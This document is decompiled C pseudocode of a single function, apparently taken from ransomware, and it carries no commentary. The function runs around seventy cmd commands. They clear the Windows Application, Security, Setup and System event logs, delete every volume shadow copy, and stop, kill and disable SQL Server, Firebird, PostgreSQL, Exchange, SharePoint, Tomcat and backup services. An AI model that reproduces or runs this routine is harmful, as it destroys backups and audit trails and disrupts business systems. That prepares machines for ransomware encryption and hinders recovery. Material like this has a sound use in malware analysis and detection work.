void StopServices()
{
  SHELLEXECUTEINFOA pExecInfo; // [esp+0h] [ebp-15Ch] BYREF
  int v1[71]; // [esp+3Ch] [ebp-120h]
  unsigned int i; // [esp+158h] [ebp-4h]

  v1[0] = (int)"/c wevtutil cl Application";
  v1[1] = (int)"/c wevtutil cl security";
  v1[2] = (int)"/c wevtutil cl setup";
  v1[3] = (int)"/c wevtutil cl system";
  v1[4] = (int)"/c vssadmin.exe delete shadows /all /quiet";
  v1[5] = (int)"/c WMIC SERVICE WHERE \"caption LIKE '%Firebird%'\" CALL STOPSERVICE";
  v1[6] = (int)"/c WMIC SERVICE WHERE \"caption LIKE '%Firebird%'\" CALL STOPSERVICE";
  v1[7] = (int)"/c WMIC SERVICE WHERE \"caption LIKE '%MSSQL%'\" CALL STOPSERVICE";
  v1[8] = (int)"/c WMIC SERVICE WHERE \"caption LIKE '%MSSQL%'\" CALL STOPSERVICE";
  v1[9] = (int)"/c WMIC SERVICE WHERE \"caption LIKE '%SQL%'\" CALL STOPSERVIC";
  v1[10] = (int)"/c WMIC SERVICE WHERE \"caption LIKE '%Exchange%'\" CALL STOPSERVICE";
  v1[11] = (int)"/c WMIC SERVICE WHERE \"caption LIKE '%wsbex%'\" CALL STOPSERVICE";
  v1[12] = (int)"/c WMIC SERVICE WHERE \"caption LIKE '%postgresql%'\" CALL STOPSERVICE";
  v1[13] = (int)"/c WMIC SERVICE WHERE \"caption LIKE '%BACKP%'\" CALL STOPSERVICE";
  v1[14] = (int)"/c WMIC SERVICE WHERE \"caption LIKE '%tomcat%'\" CALL STOPSERVICE";
  v1[15] = (int)"/c WMIC SERVICE WHERE \"caption LIKE '%SharePoint%'\" CALL STOPSERVICE";
  v1[16] = (int)"/c WMIC SERVICE WHERE \"caption LIKE '%SBS%'\" CALL STOPSERVICE";
  v1[17] = (int)"/c WMIC SERVICE WHERE \"caption LIKE '%Firebird%'\" CALL ChangeStartMode 'Disabled'";
  v1[18] = (int)"/c WMIC SERVICE WHERE \"caption LIKE '%MSSQL%'\" CALL ChangeStartMode 'Disabled'";
  v1[19] = (int)"/c WMIC SERVICE WHERE \"caption LIKE '%SQL%'\" CALL ChangeStartMode 'Disabled'";
  v1[20] = (int)"/c WMIC SERVICE WHERE \"caption LIKE '%Exchange%'\" CALL ChangeStartMode 'Disabled'";
  v1[21] = (int)"/c WMIC SERVICE WHERE \"caption LIKE '%wsbex%'\" CALL ChangeStartMode 'Disabled'";
  v1[22] = (int)"/c WMIC SERVICE WHERE \"caption LIKE '%postgresql%'\" CALL ChangeStartMode 'Disabled'";
  v1[23] = (int)"/c WMIC SERVICE WHERE \"caption LIKE '%BACKP%'\" CALL ChangeStartMode 'Disabled'";
  v1[24] = (int)"/c WMIC SERVICE WHERE \"caption LIKE '%tomcat%'\" CALL ChangeStartMode 'Disabled'";
  v1[25] = (int)"/c WMIC SERVICE WHERE \"caption LIKE '%SharePoint%'\" CALL ChangeStartMode 'Disabled'";
  v1[26] = (int)"/c WMIC SERVICE WHERE \"caption LIKE '%SBS%'\" CALL ChangeStartMode 'Disabled'";
  v1[27] = (int)"/c sc config FirebirdServerDefaultInstance start= disabled";
  v1[28] = (int)"/c sc config FirebirdServerDefaultInstance start= disabled";
  v1[29] = (int)"/c taskkill /IM fb_inet_server.exe /F";
  v1[30] = (int)"/c taskkill /IM fb_inet_server.exe /F";
  v1[31] = (int)"/c net stop FirebirdServerDefaultInstance";
  v1[32] = (int)"/c C:\\Windows\\system32\\net1 stop FirebirdServerDefaultInstance";
  v1[33] = (int)"/c taskkill /IM sqlservr.exe /F";
  v1[34] = (int)"/c sc config MSSQLSERVER start= disabled";
  v1[35] = (int)"/c sc config MSSQL$SQLEXPRESS start= disabled";
  v1[36] = (int)"/c net stop MSSQLSERVER";
  v1[37] = (int)"/c C:\\Windows\\system32\\net1 stop MSSQLSERVER";
  v1[38] = (int)"/c net stop MSSQL$SQLEXPRESS";
  v1[39] = (int)"/c net stop MSSQL$SQLEXPRESS";
  v1[40] = (int)"/c C:\\Windows\\system32\\net1 stop MSSQL$SQLEXPRESS";
  v1[41] = (int)"/c taskkill /IM pg_ctl.exe /F";
  v1[42] = (int)"/c sc config postgresql-9.0 start= disabled";
  v1[43] = (int)"/c net stop postgresql-9.0
  ";
  v1[44] = (int)"/c sc config MSExchangeAB start= disabled";
  v1[45] = (int)"/c sc config MSExchangeAntispamUpdate start= disabled";
  v1[46] = (int)"/c sc config MSExchangeEdgeSync start= disabled";
  v1[47] = (int)"/c sc config MSExchangeFDS start= disabled";
  v1[48] = (int)"/c sc config MSExchangeFBA start= disabled";
  v1[49] = (int)"/c sc config MSExchangeImap4 start= disabled";
  v1[50] = (int)"/c sc config MSExchangeImap4 start= disabled";
  v1[51] = (int)"/c sc config MSExchangeIS start= disabled";
  v1[52] = (int)"/c sc config MSExchangeMailSubmission start= disabled";
  v1[53] = (int)"/c sc config MSExchangeMailboxAssistants start= disabled";
  v1[54] = (int)"/c sc config MSExchangeMailboxReplication start= disabled";
  v1[55] = (int)"/c sc config MSExchangeMonitoring start= disabled";
  v1[56] = (int)"/c sc config MSExchangePop3 start= disabled";
  v1[57] = (int)"/c sc config MSExchangeProtectedServiceHost start= disabled";
  v1[58] = (int)"/c sc config MSExchangeRPC start= disabled";
  v1[59] = (int)"/c sc config MSExchangeSearch start= disable";
  v1[60] = (int)"/c sc config wsbexchange start= disabled";
  v1[61] = (int)"/c sc config MSExchangeSA start= disabled";
  v1[62] = (int)"/c sc config MSExchangeThrottling start= disabled";
  v1[63] = (int)"/c sc config MSExchangeTransportLogSearch start= disabled";
  v1[64] = (int)"/c net stop MSExchangeAB";
  v1[65] = (int)"/c net stop MSExchangeAntispamUpdate";
  v1[66] = (int)"/c net stop MSExchangeEdgeSync";
  v1[67] = (int)"/c net stop MSExchangeImap4";
  v1[68] = (int)"/c net stop MSExchangeMailboxReplication";
  v1[69] = (int)"/c net stop MSExchangeProtectedServiceHost";
  v1[70] = 0;
  CoInitializeEx(0, 6u);
  for ( i = 0; i < 71; ++i )
  {
    if ( v1[i] )
    {
      memset(&pExecInfo, 0, sizeof(pExecInfo));
      pExecInfo.cbSize = 60;
      pExecInfo.fMask = 64;
      pExecInfo.hwnd = 0;
      pExecInfo.lpVerb = 0;
      pExecInfo.lpFile = "cmd";
      pExecInfo.lpParameters = (LPCSTR)v1[i];
      memset(&pExecInfo.lpDirectory, 0, 12);
      ShellExecuteExA(&pExecInfo);
      WaitForSingleObject(pExecInfo.hProcess, 0xFFFFFFFF);
      CloseHandle(pExecInfo.hProcess);
    }
  }
  CoUninitialize();
}